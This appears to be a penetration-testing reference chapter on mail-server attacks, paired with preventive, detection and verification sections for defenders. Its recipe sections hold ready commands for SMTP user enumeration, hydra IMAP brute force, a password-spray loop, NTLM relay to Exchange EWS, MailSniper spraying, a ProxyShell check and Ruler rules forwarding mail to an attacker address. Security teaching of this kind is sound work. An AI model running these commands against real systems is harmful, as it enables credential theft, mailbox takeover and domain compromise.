# Mail Attacks

Attacks against mail infrastructure: open relay abuse, SMTP user
enumeration, IMAP/POP3 brute force, NTLM relay to Exchange, OWA
phishing, and mailbox persistence. The focus is on the server side
(protocol abuse) rather than on user phishing (which is file 02's
sibling concern but a separate discipline).

> [!CAUTION]
> Open relay tests and brute-force attacks against mail servers you
> do not own may violate anti-spam laws (CAN-SPAM, GDPR, CFAA) and
> the provider's acceptable-use policy. Only run these against
> systems you own or have written authorization to test.

---

## 1. Overview

Mail servers are exposed to the internet and authenticate users -
two properties that make them attractive targets. The attacks in
this file fall into three groups:

- **Protocol abuse:** open relay, VRFY/EXPN enumeration, IMAP/POP3
  brute force.
- **Authentication attacks:** NTLM relay to Exchange, password
  spraying, OWA credential phishing.
- **Post-compromise persistence:** mailbox rules, EWS abuse,
  delegation abuse.

The result is usually mailbox access (read mail, send mail as the
victim) or lateral movement into Active Directory (Exchange has high
privileges).

---

## 2. Reconnaissance / Enumeration

### 2.1 Identify the mail server software

```bash
nc -nv mail.example.com 25
```

Banner examples:

```text
220 mail.example.com ESMTP Postfix (Ubuntu)
220 mail.example.com ESMTP Sendmail 8.15.2/8.15.2
220 mail.example.com Microsoft ESMTP MAIL Service ready
220 mail.example.com ESMTP Exim 4.94
```

### 2.2 SMTP EHLO to reveal extensions

```bash
openssl s_client -connect mail.example.com:25 -starttls smtp -quiet
EHLO test
```

Watch for `VRFY`, `EXPN`, `ETRN`, `STARTTLS`, and any custom
extensions.

### 2.3 OWA/Exchange version fingerprint

```bash
curl -skI https://mail.example.com/owa/ | grep -i "X-OWA-Version"
curl -sk https://mail.example.com/owa/auth/logon.aspx | grep -oE "Version [0-9.]+"
```

Exchange version mapping:

- 15.0.x = Exchange 2013
- 15.1.x = Exchange 2016
- 15.2.x = Exchange 2019

### 2.4 Check for exposed autodiscover

```bash
curl -sk https://autodiscover.example.com/autodiscover/autodiscover.xml
# HTTP 401 with NTLM challenge = exposed
# HTTP 200 with XML = autodiscover responding
```

### 2.5 User list preparation

Sources for usernames:

- **LinkedIn / company website** - employees, formats.
- **OSINT** - data breach dumps, Hunter.io, have-i-been-pwned.
- **AD enumeration** (if internal) - `Get-ADUser -Filter *`.
- **Email pattern guessing** - first.last@, f.last@, flast@.

---

## 3. Common Attack Vectors

### 3.1 Open relay

An SMTP server that forwards mail from external senders to external
recipients without authentication. Used for spam and phishing.

**Test:** connect to SMTP, send `MAIL FROM:<attacker@external1>` and
`RCPT TO:<victim@external2>`. If the server accepts both and returns
`250` after `DATA`, it is an open relay.

**Impact:** the domain is blacklisted, phishing campaigns can be sent
from it. Rare in 2026 but still found.

### 3.2 SMTP user enumeration (VRFY/EXPN/RCPT)

- `VRFY user` - returns 250 (exists) or 550 (not).
- `EXPN list` - expands a mailing list.
- `RCPT TO:<user>` - accepts/rejects recipient before DATA.

Many servers disable VRFY and EXPN but leave RCPT usable. RCPT
enumeration is slower (one connection per user) but reliable.

### 3.3 IMAP/POP3 brute force

Mail servers often have weaker lockout policies than AD. A slow
password spray (1 attempt per hour per user) can recover credentials
without triggering AD lockout.

**Precondition:** IMAP/POP3 exposed to the internet (less common in
2026, but still found on SMB appliances and NAS mail servers).

### 3.4 NTLM relay to Exchange

Exchange accepts NTLM authentication on OWA, EWS, ActiveSync, and
Autodiscover. If SMB signing is disabled and Exchange has not enabled
EPA, an attacker can relay a captured NTLM authentication to
Exchange and impersonate the victim.

**Full chain:**

1. Coerce NTLM authentication from a victim (Responder, mitm6,
   printer bug, PetitPotam).
2. Relay to `https://mail.example.com/EWS/Exchange.asmx`.
3. Authenticate as the victim, access their mailbox, or escalate.

**Impact:** mailbox access, lateral movement. Exchange accounts often
have `WriteDacl` on the domain, leading to full AD compromise.

### 3.5 OWA credential phishing

Clone the OWA login page, host on a lookalike domain, send a
phishing email with a link. The victim enters credentials. MFA
defeats this unless the attacker also proxies MFA (Evilginx-style).

### 3.6 Password spraying

Try a single common password across many accounts. IMAP, OWA, EWS,
and ActiveSync are all valid targets. Use a slow rate to avoid
lockout.

### 3.7 Mailbox rule persistence

After mailbox access, create a rule that forwards or hides mail:

- Forward all mail to `attacker@external.com`.
- Move mail from a specific sender to `RSS Feeds` (hidden).
- Delete alerts from security tools.

Survives password reset if the rule persists in the mailbox.

### 3.8 Exchange CVE exploitation

Exchange has a long history of critical CVEs:

- **ProxyLogon (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858,
  CVE-2021-27065)** - RCE and mailbox access.
- **ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207)** -
  RCE via Autodiscover.
- **ProxyToken (CVE-2021-33766)** - bypass authentication.
- **ProxyNotShell (CVE-2022-41040, CVE-2022-41082)** - RCE.
- **OWASSRF (CVE-2022-41080)** - RCE via OWA.

**Precondition:** unpatched Exchange. Patch monthly.

---

## 4. Exploitation Recipes

### 4.1 Test for open relay

```bash
# Manual test via nc
nc mail.example.com 25
HELO test
MAIL FROM:<attacker@external1.com>
RCPT TO:<victim@external2.com>
DATA
Subject: relay test

Test message
.
QUIT
```

If the server returns `250 OK queued as ...` after `DATA`, it is an
open relay.

### 4.2 SMTP user enumeration with smtp-user-enum

```bash
# VRFY mode
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t mail.example.com

# RCPT mode
smtp-user-enum -M RCPT -U users.txt -t mail.example.com

# EXPN mode
smtp-user-enum -M EXPN -U mailing-lists.txt -t mail.example.com
```

Expected output:

```text
mail.example.com: admin exists
mail.example.com: jdoe exists
mail.example.com: root does not exist
```

### 4.3 IMAP brute force with hydra

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
    imap://mail.example.com/PLAIN
```

Expected output:

```text
[143][imap] host: mail.example.com   login: jdoe   password: Summer2026!
```

### 4.4 IMAP brute force with a custom script

```bash
# Slow spray: one attempt per hour per user
for user in $(cat users.txt); do
    for pass in Summer2026! Winter2026! Password1!; do
        timeout 5 openssl s_client -quiet -connect mail.example.com:993 <<< "a1 LOGIN $user $pass" 2>&1 | grep -q "a1 OK" && echo "$user:$pass"
        sleep 3600
    done
done
```

### 4.5 NTLM relay to Exchange EWS

```bash
# Step 1: identify relay targets (SMB signing disabled, Exchange EPA off)
netexec smb 10.0.0.0/24 --gen-relay-list relay.txt

# Step 2: start ntlmrelayx targeting Exchange EWS
sudo impacket-ntlmrelayx -tf relay.txt -t https://mail.example.com/EWS/Exchange.asmx -smb2support

# Step 3: coerce NTLM authentication from a victim
#   Responder (LLMNR/NBT-NS poison)
#   mitm6 (IPv6)
#   PetitPotam (MS-EFSRPC)
```

Expected output:

```text
[*] SMBD-Thread-3: Received connection from 10.0.0.50
[*] SMBD-Thread-3: Authenticating connection from CORP/jdoe
[*] HTTP server returned code 200
[*] Authenticated to https://mail.example.com/EWS/Exchange.asmx as CORP/jdoe
```

### 4.6 OWA brute force with spray

```bash
# Use a tool like Spray (https://github.com/Greenwolf/Spray)
# or MailSniper's Invoke-PasswordSprayOWA
Invoke-PasswordSprayOWA -ExchHostname mail.example.com -UserList users.txt -Password "Summer2026!"
```

### 4.7 Mailbox rule persistence with Ruler

```bash
# Ruler exploits the Exchange MAPI/HTTP protocol
./ruler -k --domain corp.local --email jdoe@corp.local \
    --username jdoe --password "Summer2026!" \
    display

# Add a forwarding rule
./ruler -k --domain corp.local --email jdoe@corp.local \
    --username jdoe --password "Summer2026!" \
    add --name "Update" --headers "X-Security-Update" \
    --target attacker@external.com
```

`ruler` abuses the `Set-OwaVirtualDirectory` rules to create mailbox
rules that forward or hide mail. Persistence survives password
changes.

### 4.8 Exchange CVE check (ProxyShell)

```bash
# Check Exchange version
curl -skI https://mail.example.com/owa/auth/logon.aspx | grep -i "X-OWA-Version"

# If 15.1.x or 15.2.x before the patch, test ProxyShell:
curl -sk "https://mail.example.com/autodiscover/autodiscover.json?@foo.com/&Email=autodiscover/autodiscover.json%3F@foo.com" -I
# 200 OK + version string = vulnerable

# Full exploitation: https://github.com/horizon3ai/proxyshell
```

### 4.9 Password spray with MailSniper

```bash
# Spray against OWA/EWS
Invoke-PasswordSprayEWS -ExchHostname mail.example.com \
    -UserList users.txt -Password "Summer2026!"
```

---

## 5. Post-Exploitation

After mailbox access:

- **Read mail** for sensitive information (credentials, contracts,
  internal communications).
- **Search for MFA reset tokens**, VPN credentials, or password
  reset links.
- **Send mail as the victim** (BEC, phishing of colleagues).
- **Enumerate contacts** and calendar for targets.
- **Access SharePoint/OneDrive** if the account has permissions
  (Exchange Online integration).

After Exchange compromise:

- **Dump all mailboxes** with `MailSniper` or `Ruler`.
- **Add mailbox rules** (forwarding, hiding).
- **Abuse Exchange's AD permissions** to escalate to Domain Admin
  (Exchange Windows Permissions group has `WriteDacl` on the domain).
- **Persist** via mailbox rules, EWS subscriptions, or delegate
  access.

After NTLM relay to Exchange:

- **Access the victim's mailbox** via EWS.
- **Add mailbox rules** (persistence).
- **Move laterally** using the victim's AD permissions.

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High to Critical |
| Preconditions | Mail server exposed to the internet (or foothold on the network) |
| Detectability | Medium - mail gateway logs, MFA prompts, SIEM rules |
| Business impact | Mailbox access, BEC, lateral movement, AD compromise |

Mail servers are often the **first target** in an internal
engagement: they contain credentials, MFA tokens, and internal
communications, and they have high AD privileges.

---

## 7. Root Causes (AppSec)

- Open relay misconfiguration.
- VRFY/EXPN enabled on legacy SMTP servers.
- IMAP/POP3 exposed without rate limiting or lockout.
- Exchange EPA not enforced (NTLM relay).
- OWA without MFA.
- Autodiscover over HTTP fallback.
- Users click phishing links.
- Exchange unpatched (critical CVEs).
- No mailbox rule monitoring.

---

## 8. Preventive Controls (AppSec)

### 8.1 Close the open relay

```text
# Postfix
smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated reject_unauth_destination
smtpd_recipient_restrictions = reject_unauth_destination
```

### 8.2 Disable VRFY and EXPN

```text
# Postfix
disable_vrfy_command = yes

# Exchange: disabled by default in modern versions
```

### 8.3 Require authentication and rate-limit IMAP/POP3

- If IMAP/POP3 must be internet-facing, require MFA and rate-limit
  failed logins.
- Better: restrict to the internal network or VPN.
- Best: disable if not needed.

### 8.4 Enable Extended Protection (EPA) on Exchange

EPA binds the authentication to the TLS channel, defeating NTLM
relay.

```text
# All Exchange virtual directories:
Get-WebConfigurationProperty -PSPath "MACHINE/WEBROOT/APPHOST" `
    -Filter "system.webServer/security/authentication/windowsAuthentication" `
    -Name "extendedProtection.tokenChecking"
# Must be "Require"
```

### 8.5 Enforce MFA on all mail protocols

Azure AD Conditional Access for:

- OWA
- EWS
- ActiveSync
- IMAP
- POP3
- SMTP AUTH (deprecated; use OAuth)

### 8.6 Patch Exchange monthly

Exchange CVEs are critical and exploited in the wild. Subscribe to
Microsoft security advisories and apply patches within 24-48 hours
of release.

### 8.7 Block HTTP autodiscover fallback

Publish `autodiscover.example.com` with a valid certificate. Block
the HTTP fallback at the network edge.

### 8.8 Mail gateway

- Inbound: SPF, DKIM, DMARC validation, spam filtering, attachment
  scanning, URL rewriting.
- Outbound: DLP, encryption, rate limiting.

### 8.9 Monitor mailbox rules

- Alert on new forwarding rules to external addresses.
- Alert on rules that move mail to `RSS Feeds`, `Deleted Items`,
  or `Conversation History` (common hiding places).
- Alert on delegate access changes.

### 8.10 User awareness

Phishing simulation and training reduces (but never eliminates)
the risk of OWA credential phishing.

---

## 9. Detection Controls (AppSec)

### 9.1 SMTP anomalies

- Relay attempts from unauthenticated sources.
- High volume of outbound mail from a single account.
- Unusual sender/recipient patterns.
- Failed authentication attempts (brute force).

### 9.2 IMAP/POP3 anomalies

- Authentication from unusual geographies.
- Many failed logins for the same user.
- IMAP/POP3 connections from outside the corporate network (if
  unexpected).

### 9.3 Exchange-specific

- New mailbox rules (forwarding, hiding, deletion).
- EWS access from unusual clients (user agents).
- OWA login from unfamiliar IPs.
- Autodiscover requests without a matching Outlook client.
- NTLM authentication to Exchange without EPA.

### 9.4 Windows Event IDs

- **4625** - failed logon.
- **4768/4769** - Kerberos TGT/TGS.
- **4776** - NTLM authentication (relay indicator).
- **Exchange logs** - EWS, OWA, ActiveSync authentication and
  mailbox access.
- **Event 8** (MSExchange Management) - mailbox rule creation.

### 9.5 SIEM rules

- Alert on > 10 failed IMAP logins per user per minute.
- Alert on new mailbox forwarding rule to an external address.
- Alert on OWA login from a new country.
- Alert on EWS requests with unusual user agents.
- Alert on NTLM authentication to Exchange (if EPA is enforced,
  this should be zero).

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **Open relay:** attempt to relay mail from `external1.com` to
   `external2.com`. Should be rejected.
2. **VRFY/EXPN:** run `smtp-user-enum` against the server. Should
   return errors, not user existence.
3. **MFA:** attempt OWA login with valid credentials but no MFA.
   Should fail.
4. **EPA:** attempt an NTLM relay to Exchange (from a lab host with
   `ntlmrelayx`). Should be rejected.
5. **Mailbox rules:** create a forwarding rule to an external
   address. The SIEM should alert.
6. **Patching:** check the Exchange build number against the latest
   Microsoft security update.

---

## 11. OSCP Notes

Mail attacks are **not** in the OSCP exam. They are relevant for:

- Real internal engagements where Exchange is present.
- PEN-200 covers password attacks (IMAP spray is one).
- Red team operations targeting corporate infrastructure.

For the report, document:

- The mail server software and version.
- The enumeration technique (banner, VRFY, RCPT, autodiscover).
- The attack path (open relay, brute force, NTLM relay).
- The defensive control (SPF/DKIM/DMARC, MFA, EPA, patching,
  mailbox rule monitoring).

---

## 12. Production Notes

- **Open relay tests may be illegal** in some jurisdictions even
  against your own infrastructure if the mail is sent to external
  addresses. Use internal test domains (example.com).
- **Brute force is loud.** Even slow sprays trigger alerts on
  modern SIEMs. Assume detection.
- **NTLM relay to Exchange is the highest-value attack** in most
  internal networks. Enable EPA and SMB signing everywhere.
- **Mailbox rule persistence survives password reset.** Create a
  rule and the attacker keeps access even after the user changes
  their password.
- **Exchange patch lag is the #1 risk.** Unpatched Exchange is
  exploited within hours of a CVE release.
- **OWA phishing is the most common initial access vector** in
  ransomware campaigns. MFA + user training are the only effective
  controls.
- **Do not store captured credentials in plain text.** Mail
  credentials are sensitive. Encrypt captures and delete after the
  engagement.

---

## 13. References

- [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) -
  SMTP user enumeration
- [hydra](https://github.com/vanhauser-thc/thc-hydra) - IMAP/POP3
  brute force
- [Ruler](https://github.com/sensepost/ruler) - Exchange mailbox
  rule exploitation
- [MailSniper](https://github.com/dafthack/MailSniper) - OWA/EWS
  password spray and mailbox search
- [impacket ntlmrelayx](https://github.com/fortra/impacket) -
  NTLM relay
- [ProxyShell exploitation](https://github.com/horizon3ai/proxyshell)
- [MITRE ATT&CK T1114 - Email Collection](https://attack.mitre.org/techniques/T1114/)
- [MITRE ATT&CK T1114.002 - Remote Email Collection](https://attack.mitre.org/techniques/T1114/002/)
- Microsoft Docs - Exchange Extended Protection (EPA)
- NIST SP 800-45 - Guidelines on Electronic Mail Security
- `man smtp-user-enum`, `man hydra`